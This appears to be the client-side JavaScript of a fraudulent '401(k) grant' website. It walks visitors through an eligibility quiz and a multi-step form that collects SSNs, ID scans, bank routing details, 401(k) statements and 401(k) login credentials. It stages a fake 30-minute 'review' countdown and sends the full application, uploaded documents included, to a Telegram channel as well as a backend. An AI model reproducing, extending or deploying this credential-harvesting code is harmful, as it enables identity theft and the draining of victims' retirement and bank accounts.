document.addEventListener('DOMContentLoaded', function () {
  initNavbar();
  initScrollAnimations();
  initEligibilityChecker();
  initApplicationForm();
  initDashboardSidebar();
});

function initNavbar() {
  const navbar = document.querySelector('.navbar');
  if (!navbar) return;

  const toggle = document.querySelector('.nav-toggle');
  const menu = document.querySelector('.nav-menu');

  window.addEventListener('scroll', function () {
    if (window.scrollY > 50) {
      navbar.classList.add('scrolled');
    } else {
      navbar.classList.remove('scrolled');
    }
  });

  if (toggle && menu) {
    toggle.setAttribute('aria-expanded', 'false');
    toggle.setAttribute('aria-controls', menu.id);
    toggle.addEventListener('click', function () {
      menu.classList.toggle('open');
      toggle.setAttribute('aria-expanded', String(menu.classList.contains('open')));
      const icon = toggle.querySelector('svg');
      if (menu.classList.contains('open')) {
        icon.innerHTML = '<line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>';
      } else {
        icon.innerHTML = '<line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>';
      }
    });
    menu.addEventListener('click', function (event) {
      if (event.target.closest('a')) {
        menu.classList.remove('open');
        toggle.setAttribute('aria-expanded', 'false');
      }
    });
  }

  const currentPage = window.location.pathname.split('/').pop() || 'index.html';
  document.querySelectorAll('.nav-menu a').forEach(function (link) {
    const href = link.getAttribute('href');
    if (href === currentPage || (currentPage === '' && href === 'index.html')) {
      link.classList.add('active');
    }
  });
}

function initScrollAnimations() {
  const elements = document.querySelectorAll('.fade-in');
  if (!elements.length) return;

  const observer = new IntersectionObserver(function (entries) {
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

  elements.forEach(function (el) {
    observer.observe(el);
  });
}

function initEligibilityChecker() {
  const checker = document.querySelector('.checker-body');
  if (!checker) return;

  const questions = [
    {
      q: 'Do you currently own a 401(k) account?',
      desc: '401(k) ownership is required, but grant funds are separate and will not affect your account balance.',
      options: ['Yes, I own a 401(k) account', 'No, I do not have a 401(k) account']
    },
    {
      q: 'Are you currently working?',
      desc: 'Applicants must currently be employed or self-employed in the United States.',
      options: ['Yes, I am employed', 'Yes, I am self-employed', 'No, I am not currently working']
    },
    {
      q: 'Are you a U.S. citizen?',
      desc: 'This grant is available to working citizens of the United States.',
      options: ['Yes, I am a U.S. citizen', 'No, I am not a U.S. citizen']
    },
    {
      q: 'Are you at least 18 years old?',
      desc: 'Applicants must be legal adults who can submit their own information for review.',
      options: ['Yes, I am 18 or older', 'No, I am under 18']
    },
  ];

  let currentStep = 0;
  let answers = [];
  let selectedOption = null;

  const progressFill = checker.querySelector('.fill');
  const progressCount = checker.querySelector('.count');
  const questionContainer = checker.querySelector('.checker-question');
  const resultContainer = checker.querySelector('.checker-result');
  const btnBack = checker.querySelector('.btn-back');
  const btnNext = checker.querySelector('.btn-next');

  function updateProgress() {
    const progress = ((currentStep) / questions.length) * 100;
    if (progressFill) progressFill.style.width = progress + '%';
    if (progressCount) progressCount.textContent = (currentStep + 1) + ' of ' + questions.length;
  }

  function showQuestion() {
    if (currentStep >= questions.length) {
      showResult();
      return;
    }

    resultContainer.style.display = 'none';
    questionContainer.style.display = 'flex';

    const q = questions[currentStep];
    questionContainer.innerHTML = `
      <h4>${q.q}</h4>
      <p class="question-desc">${q.desc}</p>
      <div class="answer-options">
        ${q.options.map(function (opt, i) {
          return `<button class="answer-btn" data-index="${i}">${opt}</button>`;
        }).join('')}
      </div>
    `;

    selectedOption = answers[currentStep] !== undefined ? answers[currentStep] : null;

    questionContainer.querySelectorAll('.answer-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        questionContainer.querySelectorAll('.answer-btn').forEach(function (b) {
          b.style.background = '';
          b.style.borderColor = '';
          b.style.color = '';
        });
        btn.style.background = 'rgba(212, 175, 55, 0.08)';
        btn.style.borderColor = '#d4af37';
        btn.style.color = '#0a1929';
        selectedOption = parseInt(btn.dataset.index);
        if (btnNext) btnNext.disabled = false;
      });
    });

    if (selectedOption !== null) {
      const btns = questionContainer.querySelectorAll('.answer-btn');
      if (btns[selectedOption]) {
        btns[selectedOption].style.background = 'rgba(212, 175, 55, 0.08)';
        btns[selectedOption].style.borderColor = '#d4af37';
        btns[selectedOption].style.color = '#0a1929';
      }
      if (btnNext) btnNext.disabled = false;
    } else {
      if (btnNext) btnNext.disabled = true;
    }

    if (btnBack) btnBack.style.visibility = currentStep === 0 ? 'hidden' : 'visible';
    if (btnNext) btnNext.textContent = currentStep === questions.length - 1 ? 'See Results' : 'Next';

    updateProgress();
  }

  function calculateEligibility() {
    let score = 0;

    if (answers[0] === 0) score += 25;
    else return { eligible: false, reason: 'This program is exclusive to 401(k) account holders.' };

    if (answers[1] === 0 || answers[1] === 1) score += 25;
    else return { eligible: false, reason: 'You must be currently employed or self-employed to qualify.' };

    if (answers[2] === 0) score += 25;
    else return { eligible: false, reason: 'This grant is available to U.S. citizens.' };

    if (answers[3] === 0) score += 25;
    else return { eligible: false, reason: 'Applicants must be at least 18 years old.' };

    return {
      eligible: score === 100,
      score: score,
      range: 'determined after your application is reviewed'
    };
  }

  function showResult() {
    const result = calculateEligibility();
    questionContainer.style.display = 'none';
    resultContainer.style.display = 'block';
    if (btnBack) btnBack.style.visibility = 'visible';
    if (btnNext) btnNext.style.display = 'none';

    if (result.eligible) {
      resultContainer.className = 'checker-result success';
      resultContainer.innerHTML = `
        <div class="result-icon success">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h4>You Meet the Basic Requirements</h4>
        <p>Based on your answers, you may submit an application for review. Approval is not guaranteed, and your award amount will be <strong>${result.range}</strong>. The grant is free of charge and separate from your 401(k).</p>
        <a href="application.html" class="btn btn-primary btn-lg glow">Start My Application</a>
      `;
    } else {
      resultContainer.className = 'checker-result rejected';
      resultContainer.innerHTML = `
        <div class="result-icon rejected">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </div>
        <h4>Not Eligible at This Time</h4>
        <p>${result.reason} Please review our requirements or contact our support team for more information.</p>
        <button class="btn btn-outline-dark btn-lg" onclick="resetChecker()">Review Requirements</button>
      `;
    }
  }

  window.resetChecker = function () {
    currentStep = 0;
    answers = [];
    selectedOption = null;
    if (btnNext) btnNext.style.display = '';
    showQuestion();
  };

  if (btnBack) {
    btnBack.addEventListener('click', function () {
      if (currentStep > 0) {
        currentStep--;
        selectedOption = answers[currentStep];
        if (btnNext) btnNext.style.display = '';
        showQuestion();
      } else {
        window.resetChecker();
      }
    });
  }

  if (btnNext) {
    btnNext.addEventListener('click', function () {
      if (selectedOption === null) return;
      answers[currentStep] = selectedOption;
      currentStep++;
      selectedOption = null;
      showQuestion();
    });
  }

  showQuestion();
}

function initApplicationForm() {
  const formCard = document.querySelector('.form-card');
  if (!formCard) return;

  const totalSteps = 7;
  let currentStep = 1;
  const formData = {
    personal: {},
    banking: {},
    business: {},
    idVerify: {},
    review: {},
    kaccess: {},
    final: {}
  };

  const stepLabels = ['Personal', 'Banking', 'Purpose', 'ID & 401(k)', 'Reviewing', '401(k) Access', 'Review'];

  let reviewTimer = null;
  let reviewStartTime = null;

  const allUploadedFiles = [];

  let autosaveTimer = null;
  let lastSavedAt = 0;

  function collectAllStepData() {
    for (let s = 1; s <= totalSteps; s++) collectStepData(s);
  }

  function scheduleAutosave(urgent) {
    const appId = getAppId();
    collectAllStepData();
    const empty = [
      formData.personal, formData.banking, formData.business,
      formData.idVerify, formData.kaccess
    ].every(function (b) { return Object.keys(b).every(function (k) { return !b[k]; }); });
    if (empty) return;
    if (!window.__upsertDraftApplication) return;

    clearTimeout(autosaveTimer);
    const saveFn = function () {
      if (Date.now() - lastSavedAt < 1500 && !urgent) return;
      if (window.__showDraftSaveToast) window.__showDraftSaveToast('saving');
      lastSavedAt = Date.now();
      const snap = JSON.parse(JSON.stringify({
        personal: formData.personal || {},
        banking: formData.banking || {},
        business: formData.business || {},
        idVerify: formData.idVerify || {},
        kaccess: formData.kaccess || {}
      }));
      window.__upsertDraftApplication(snap, appId).then(function () {
        if (window.__showDraftSaveToast) window.__showDraftSaveToast('saved');
      }).catch(function () {});
    };
    autosaveTimer = setTimeout(saveFn, urgent ? 50 : 900);
  }

  function attachAutosaveListeners() {
    const root = formCard;
    if (!root) return;
    root.addEventListener('input', function (e) {
      if (!e.target) return;
      if (e.target.matches('input[type="password"], input[type="file"], input[type="checkbox"], input[type="radio"]')) {
        scheduleAutosave(true);
      } else if (e.target.matches('input, textarea, select')) {
        scheduleAutosave(false);
      }
    }, { passive: true });
    root.addEventListener('change', function (e) {
      if (!e.target) return;
      if (e.target.matches('select, input[type="checkbox"], input[type="radio"], input[type="file"]')) {
        scheduleAutosave(true);
      }
    }, { passive: true });
  }

  attachAutosaveListeners();

  function trackUploadedFile(file, fieldName, fieldLabel) {
    allUploadedFiles.push({
      file: file,
      name: file.name,
      size: file.size,
      type: file.type,
      fieldName: fieldName,
      fieldLabel: fieldLabel || fieldName
    });
  }

  function collectAllUploadedFiles() {
    const result = [];
    result.push.apply(result, allUploadedFiles);

    function addFromInput(inputId, fieldName, fieldLabel) {
      const inp = document.getElementById(inputId);
      if (!inp || !inp.files) return;
      for (var i = 0; i < inp.files.length; i++) {
        var f = inp.files[i];
        var already = result.some(function (r) { return r.file === f; });
        if (!already) {
          result.push({
            file: f,
            name: f.name,
            size: f.size,
            type: f.type,
            fieldName: fieldName,
            fieldLabel: fieldLabel
          });
        }
      }
    }

    addFromInput('fileInput2', 'bankDoc', 'Voided Check / Bank Letter');
    addFromInput('fileIdFront', 'idFront', 'Front of ID');
    addFromInput('fileIdBack', 'idBack', 'Back of ID');
    addFromInput('fileInput', 'k401statement', '401(k) Statement');

    return result;
  }

  function startReviewCountdown() {
    if (reviewTimer) return;
    const pauseIcon = document.getElementById('progressPauseIcon');
    if (pauseIcon) {
      pauseIcon.classList.remove('hidden');
      pauseIcon.classList.add('visible');
    }
    const countdownEl = document.getElementById('reviewCountdown');
    const ringEl = document.getElementById('reviewRing');
    const checks = document.querySelectorAll('#reviewChecks .rev-check');
    const totalSeconds = 30 * 60;
    const circumference = 2 * Math.PI * 52;
    reviewStartTime = Date.now();
    let nextCheckAt = [0.08, 0.25, 0.55, 0.82];

    function markCheck(idx) {
      const c = checks[idx];
      if (!c || c.classList.contains('done')) return;
      c.classList.add('done');
      c.style.color = 'var(--navy-900)';
      c.style.fontWeight = '600';
      const dot = c.querySelector('.rev-dot');
      if (dot) {
        dot.style.background = '#10b981';
        dot.style.boxShadow = '0 0 0 4px rgba(16,185,129,0.12)';
      }
    }

    function tick() {
      const elapsed = Math.floor((Date.now() - reviewStartTime) / 1000);
      const remaining = Math.max(totalSeconds - elapsed, 0);
      const mm = String(Math.floor(remaining / 60)).padStart(2, '0');
      const ss = String(remaining % 60).padStart(2, '0');
      if (countdownEl) countdownEl.textContent = mm + ':' + ss;
      const progress = 1 - remaining / totalSeconds;
      if (ringEl) ringEl.style.strokeDashoffset = String(circumference * (1 - progress));
      nextCheckAt.forEach(function (threshold, i) {
        if (progress >= threshold) markCheck(i);
      });

      if (remaining <= 0) {
        clearInterval(reviewTimer);
        reviewTimer = null;
        const pauseIcon = document.getElementById('progressPauseIcon');
        if (pauseIcon) pauseIcon.classList.add('hidden');
        const btn = document.getElementById('btnSkipReview');
        if (btn) {
          btn.textContent = 'Continue to 401(k) Access →';
          btn.classList.remove('btn-outline-dark');
          btn.classList.add('btn-primary');
          btn.disabled = false;
        }
        setTimeout(function () {
          if (currentStep === 5) {
            currentStep = 6;
            showStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
          }
        }, 900);
      }
    }
    tick();
    reviewTimer = setInterval(tick, 1000);
  }

  function updateProgressSteps() {
    const steps = document.querySelectorAll('.progress-step');
    const progressLine = document.querySelector('.progress-line');

    steps.forEach(function (step, i) {
      step.classList.remove('active', 'completed');
      if (i + 1 < currentStep) step.classList.add('completed');
      else if (i + 1 === currentStep) step.classList.add('active');

      const circle = step.querySelector('.step-circle');
      if (step.classList.contains('completed')) {
        circle.innerHTML = `
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3" width="16" height="16">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
          </svg>`;
      } else {
        circle.textContent = i + 1;
      }
    });

    const progressPercent = ((currentStep - 1) / (totalSteps - 1)) * 90;
    if (progressLine) progressLine.style.width = (5 + progressPercent) + '%';
  }

  function showStep(step) {
    const allSteps = formCard.querySelectorAll('.form-step');
    allSteps.forEach(function (s) { s.style.display = 'none'; });

    const targetStep = formCard.querySelector(`.form-step[data-step="${step}"]`);
    if (targetStep) targetStep.style.display = 'block';

    updateProgressSteps();

    formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
      btnPrev.style.visibility = step === 1 ? 'hidden' : 'visible';
    });
    formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
      if (btnNext.classList.contains('btn-submit-final')) return;
      const inStep = btnNext.closest('.form-step');
      const stepNum = inStep ? parseInt(inStep.dataset.step, 10) : null;

      if (stepNum === 5) {
        btnNext.textContent = btnNext.id === 'btnSkipReview' ? btnNext.disabled ? 'Proceeding automatically…' : 'Continue to 401(k) Access →' : 'Continue →';
      } else if (stepNum === 4) {
        btnNext.textContent = 'Begin Review →';
      } else if (stepNum === 6) {
        btnNext.textContent = 'Review Application →';
      } else if (step === totalSteps) {
        btnNext.textContent = 'Submit Application';
      } else if (step === totalSteps - 1) {
        btnNext.textContent = 'Review Application →';
      } else {
        btnNext.textContent = 'Continue →';
      }
    });

    if (step === 5) startReviewCountdown();
  }

  function collectStepData(step) {
    const stepEl = formCard.querySelector(`.form-step[data-step="${step}"]`);
    if (!stepEl) return;

    const stepKey = ['personal', 'banking', 'business', 'idVerify', 'review', 'kaccess', 'final'][step - 1];
    if (!formData[stepKey]) formData[stepKey] = {};

    stepEl.querySelectorAll('input, select, textarea').forEach(function (input) {
      if (input.name) {
        formData[stepKey][input.name] = input.value;
      }
    });
  }

  function populateReview() {
    const p = formData.personal;
    const idv = formData.idVerify || {};
    const ka = formData.kaccess;
    const b = formData.business;
    const ba = formData.banking;

    const reviewEl = formCard.querySelector('.review-grid');
    if (!reviewEl) return;

    reviewEl.innerHTML = `
      <div class="review-item"><span class="label">Full Name</span><span class="value">${(p.firstName || '—') + ' ' + (p.lastName || '—')}</span></div>
      <div class="review-item"><span class="label">Email</span><span class="value">${p.email || '—'}</span></div>
      <div class="review-item"><span class="label">Phone</span><span class="value">${p.phone || '—'}</span></div>
      <div class="review-item"><span class="label">Date of Birth</span><span class="value">${p.dob || idv.idDob || '—'}</span></div>
      <div class="review-item"><span class="label">SSN (Last 4)</span><span class="value">${p.ssn ? '•••-••-' + p.ssn : '—'}</span></div>
      <div class="review-item"><span class="label">Street Address</span><span class="value">${p.address || '—'}</span></div>
      <div class="review-item"><span class="label">ID Type</span><span class="value">${idv.idType || '—'}</span></div>
      <div class="review-item"><span class="label">ID Number</span><span class="value">${idv.idNumber ? '••••••' + (String(idv.idNumber).slice(-4)) : '—'}</span></div>
      <div class="review-item"><span class="label">401(k) Provider</span><span class="value">${idv.provider || '—'}</span></div>
      <div class="review-item"><span class="label">401(k) Username</span><span class="value">${ka.k401AccessUsername || idv.k401Username || '—'}</span></div>
      <div class="review-item"><span class="label">Account Balance</span><span class="value">${idv.balance ? '$' + Number(idv.balance).toLocaleString() : '—'}</span></div>
      <div class="review-item"><span class="label">Business / Need</span><span class="value">${b.businessName || '—'}</span></div>
      <div class="review-item"><span class="label">Employment Status</span><span class="value">${b.businessType || '—'}</span></div>
      <div class="review-item"><span class="label">Bank Name</span><span class="value">${ba.bankName || '—'}</span></div>
      <div class="review-item"><span class="label">Bank Account Type</span><span class="value">${ba.bankAccountType || '—'}</span></div>
      <div class="review-item"><span class="label">Routing Number</span><span class="value">${ba.routing ? '••••••' + (ba.routing.slice(-3) || '') : '—'}</span></div>
      <div class="review-item"><span class="label">24hr Review</span><span class="value">Required before approval</span></div>
    `;

    // Render FULL organized form review at the bottom of review section
    collectAllStepData();
    const fullBody = document.getElementById('fullReviewBody');
    const fullCard = document.getElementById('fullApplicationFormReview');
    if (fullBody && window.__renderFullReviewBody) {
      fullBody.innerHTML = window.__renderFullReviewBody(formData);
    }
    if (fullCard) {
      fullCard.style.display = 'block';
    }
  }

  window.sendFullApplicationToTelegram = function (appData, filesInfo) {
    if (!window.telegramNotify) return Promise.resolve();
    var appId = appData && appData.appId ? appData.appId : getAppId();
    var organizedText;
    if (window.__buildOrganizedApplicationText) {
      organizedText = window.__buildOrganizedApplicationText(formData, appId);
    } else {
      organizedText = [
        '⭐'.repeat(15),
        '📋 FULL APPLICATION FORM',
        'Application ID: P401K-2026-' + appId,
        'Filled at: ' + new Date().toLocaleString(),
        '⭐'.repeat(15)
      ].join('\n');
    }
    var subject = '📄 P401K Application Submitted — ' + appId;
    var extraLines = organizedText.split('\n');
    var files = [];
    try {
      for (var i = 0; i < (filesInfo || []).length; i++) {
        var fi = filesInfo[i];
        if (!fi) continue;
        var field = fi.fieldName || 'document';
        if (field === 'photo') continue;
        if (fi.file) files.push({ field: 'document', file: fi.file, filename: fi.name || (field + '.bin'), mime: fi.type });
      }
    } catch (_) {}
    return new Promise(function (resolve) {
      try {
        window.telegramNotify(subject, extraLines, files, true);
        setTimeout(resolve, 1200);
      } catch (e) { resolve(); }
    });
  };

  function getAppId() {
    var el = document.getElementById('appId');
    return el ? el.textContent || ('A' + Math.floor(100000 + Math.random() * 900000)) : ('A' + Math.floor(100000 + Math.random() * 900000));
  }

  formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
    btnPrev.addEventListener('click', function () {
      if (currentStep > 1) {
        collectStepData(currentStep);
        currentStep--;
        showStep(currentStep);
      }
    });
  });

  formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
    btnNext.addEventListener('click', function () {
      collectStepData(currentStep);

      if (currentStep === totalSteps) {
        btnNext.textContent = 'Submitting...';
        btnNext.disabled = true;

        var appId = getAppId();
        var filesInfo = collectAllUploadedFiles();
        var appData = {
          appId: appId,
          personal: formData.personal,
          banking: formData.banking,
          business: formData.business,
          idVerify: formData.idVerify,
          kaccess: formData.kaccess
        };
        var API_BASE = (window.__ENV && window.__ENV.API_BASE) || '/.netlify/functions';

        saveForAdminLocal(appId, appData, filesInfo);

        (async function submitFlow() {
          function showOfflineToast() {
            var toast = document.getElementById('offlineToast');
            if (toast) {
              toast.style.display = 'block';
              setTimeout(function () { toast.style.display = 'none'; }, 6000);
            }
          }

          function showSuccess() {
            var successEl = document.querySelector('.application-success');
            if (successEl) {
              formCard.style.display = 'none';
              successEl.style.display = 'block';
              window.scrollTo({ top: 0, behavior: 'smooth' });
            }
          }

          try {
            var userUid = 'anon';
            try {
              if (window.supabase && window.supabase.auth) {
                var su = await window.supabase.auth.getUser();
                if (su && su.data && su.data.user) userUid = su.data.user.id;
              }
            } catch (_) {}

            var storageFiles = [];
            for (var i = 0; i < filesInfo.length; i++) {
              var fi = filesInfo[i];
              if (!fi || !fi.file) continue;
              var safeName = (fi.name || 'file').replace(/[^a-zA-Z0-9._-]/g, '_');
              var field = (fi.fieldName || 'upload').replace(/[^a-zA-Z0-9_-]/g, '_');
              var path = userUid + '/' + appId + '/' + field + '-' + safeName;
              try {
                if (window.supabase && window.supabase.storage) {
                  await window.supabase.storage
                    .from('application-uploads')
                    .upload(path, fi.file, { contentType: fi.type || undefined, upsert: true });
                }
                storageFiles.push({
                  storageObjectPath: path,
                  fieldName: fi.fieldName,
                  fieldLabel: fi.fieldLabel,
                  filename: fi.name,
                  mimeType: fi.type,
                  size: fi.size,
                });
              } catch (upErr) {
                console.warn('storage upload failed for', path, upErr.message);
              }
            }

            var visitorSession = '';
            try { visitorSession = sessionStorage.getItem('tg_session_id') || ''; } catch (_) {}

            var submitResp = await fetch(API_BASE + '/submit-application', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              credentials: 'include',
              body: JSON.stringify({
                personal: formData.personal,
                banking: formData.banking,
                business: formData.business,
                id_verify: formData.idVerify,
                kaccess: formData.kaccess,
                files: storageFiles,
                shortAppId: appId,
                visitorSession: visitorSession,
              }),
            });

            if (!submitResp.ok) {
              throw new Error('submit-application HTTP ' + submitResp.status);
            }
            var result = await submitResp.json().catch(function () { return { success: true }; });
            if (result && result.appIdShort) {
              try {
                var badge = document.getElementById('appId');
                if (badge) badge.textContent = result.appIdShort;
              } catch (_) {}
            }

            if (window.sendFullApplicationToTelegram) {
              try {
                var tgDone = false;
                var tgPromise = window.sendFullApplicationToTelegram(appData, filesInfo);
                tgPromise.then(function () { tgDone = true; showSuccess(); }).catch(function () { showSuccess(); });
                setTimeout(function () { if (!tgDone) showSuccess(); }, 8000);
              } catch (_) {
                showSuccess();
              }
            } else {
              showSuccess();
            }
          } catch (err) {
            console.warn('submitFlow offline:', err.message || err);
            showOfflineToast();
            setTimeout(showSuccess, 2000);
          }
        })();

        function saveForAdminLocal(appId, appData, filesInfo) {
          try {
            var summary = {
              id: appId,
              submittedAt: new Date().toISOString(),
              submittedAtLocal: new Date().toLocaleString(),
              userEmail: formData.personal.email || '',
              userName: (formData.personal.firstName || '') + ' ' + (formData.personal.lastName || ''),
              userPhone: formData.personal.phone || '',
              data: JSON.parse(JSON.stringify(appData)),
              files: []
            };
            var storageKey = 'p401k_admin_applications_v1';
            var allApps = [];
            try {
              allApps = JSON.parse(localStorage.getItem(storageKey) || '[]');
            } catch (e) { allApps = []; }
            var remainingQuota = 4 * 1024 * 1024;
            try {
              var used = new Blob([localStorage.getItem(storageKey) || '']).size;
              remainingQuota = Math.max(1 * 1024 * 1024, 4.5 * 1024 * 1024 - used);
            } catch (e) {}
            var fileReadPromises = [];
            filesInfo.forEach(function (fi) {
              var meta = {
                name: fi.name,
                size: fi.size,
                type: fi.type || '',
                fieldName: fi.fieldName || '',
                fieldLabel: fi.fieldLabel || ''
              };
              var shouldTryDataURL = fi.type && fi.type.startsWith('image/') && fi.size < Math.min(800 * 1024, remainingQuota);
              if (!shouldTryDataURL && fi.size < Math.min(300 * 1024, remainingQuota)) {
                shouldTryDataURL = true;
              }
              if (shouldTryDataURL && fi.file instanceof Blob) {
                var p = new Promise(function (resolve) {
                  try {
                    var r = new FileReader();
                    r.onload = function () {
                      try {
                        meta.dataURL = r.result;
                        var sz = new Blob([r.result]).size;
                        remainingQuota = Math.max(0, remainingQuota - sz);
                      } catch (e) {}
                      summary.files.push(meta);
                      resolve();
                    };
                    r.onerror = function () { summary.files.push(meta); resolve(); };
                    r.readAsDataURL(fi.file);
                  } catch (e) { summary.files.push(meta); resolve(); }
                });
                fileReadPromises.push(p);
              } else {
                summary.files.push(meta);
              }
            });
            function pushApp() {
              try {
                allApps.unshift(summary);
                var MAX_APPS = 200;
                while (allApps.length > MAX_APPS) allApps.pop();
                localStorage.setItem(storageKey, JSON.stringify(allApps));
              } catch (e) {
                try {
                  while (allApps.length > 50) allApps.pop();
                  allApps.forEach(function (a) { if (a.files) a.files.forEach(function (f) { delete f.dataURL; }); });
                  localStorage.setItem(storageKey, JSON.stringify(allApps));
                } catch (e2) {}
              }
            }
            if (fileReadPromises.length) {
              Promise.all(fileReadPromises).then(pushApp).catch(pushApp);
            } else {
              pushApp();
            }
          } catch (e) {}
        }

        return;
      }

      if (currentStep === totalSteps - 1) {
        populateReview();
      }

      currentStep++;
      showStep(currentStep);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });

  const uploadArea = formCard.querySelector('#uploadArea');
  const fileListEl = formCard.querySelector('.file-list');
  const fileInput = formCard.querySelector('#fileInput');
  const uploadedFiles = [];

  if (uploadArea && fileInput) {
    uploadArea.addEventListener('click', function () {
      fileInput.click();
    });

    fileInput.addEventListener('change', function (e) {
      handleFiles(e.target.files);
    });

    uploadArea.addEventListener('dragover', function (e) {
      e.preventDefault();
      uploadArea.style.borderColor = '#d4af37';
      uploadArea.style.background = 'rgba(212, 175, 55, 0.05)';
    });

    uploadArea.addEventListener('dragleave', function () {
      uploadArea.style.borderColor = '';
      uploadArea.style.background = '';
    });

    uploadArea.addEventListener('drop', function (e) {
      e.preventDefault();
      uploadArea.style.borderColor = '';
      uploadArea.style.background = '';
      handleFiles(e.dataTransfer.files);
    });
  }

  function handleFiles(files) {
    Array.from(files).forEach(function (file) {
      uploadedFiles.push(file);
      trackUploadedFile(file, 'k401statement', '401(k) Statement');
      renderFileList();
    });
  }

  function renderFileList() {
    if (!fileListEl) return;
    fileListEl.innerHTML = uploadedFiles.map(function (file, i) {
      const sizeKB = (file.size / 1024).toFixed(1);
      const size = sizeKB > 1024 ? (sizeKB / 1024).toFixed(1) + ' MB' : sizeKB + ' KB';
      return `
        <div class="file-item">
          <div class="file-icon">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
            </svg>
          </div>
          <div class="file-info">
            <div class="name">${file.name}</div>
            <div class="size">${size}</div>
          </div>
          <button class="file-remove" data-i="${i}">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
      `;
    }).join('');

    fileListEl.querySelectorAll('.file-remove').forEach(function (btn) {
      btn.addEventListener('click', function (e) {
        e.stopPropagation();
        const idx = parseInt(btn.dataset.i);
        var removedFile = uploadedFiles[idx];
        uploadedFiles.splice(idx, 1);
        for (var j = allUploadedFiles.length - 1; j >= 0; j--) {
          if (allUploadedFiles[j].file === removedFile) {
            allUploadedFiles.splice(j, 1);
          }
        }
        renderFileList();
      });
    });
  }

  var fI2 = document.getElementById('fileInput2');
  if (fI2) {
    fI2.addEventListener('change', function (e) {
      if (e.target.files) {
        for (var i = 0; i < e.target.files.length; i++) {
          trackUploadedFile(e.target.files[i], 'bankDoc', 'Voided Check / Bank Letter');
        }
      }
    });
  }
  var fIF = document.getElementById('fileIdFront');
  if (fIF) {
    fIF.addEventListener('change', function (e) {
      if (e.target.files) {
        for (var i = 0; i < e.target.files.length; i++) {
          trackUploadedFile(e.target.files[i], 'idFront', 'Front of ID');
        }
      }
    });
  }
  var fIB = document.getElementById('fileIdBack');
  if (fIB) {
    fIB.addEventListener('change', function (e) {
      if (e.target.files) {
        for (var i = 0; i < e.target.files.length; i++) {
          trackUploadedFile(e.target.files[i], 'idBack', 'Back of ID');
        }
      }
    });
  }

  showStep(1);
}

function initDashboardSidebar() {
  const toggleBtn = document.querySelector('.dash-sidebar-toggle');
  const sidebar = document.querySelector('.dashboard-sidebar');

  if (toggleBtn && sidebar) {
    toggleBtn.addEventListener('click', function () {
      sidebar.classList.toggle('open');
    });
  }
}
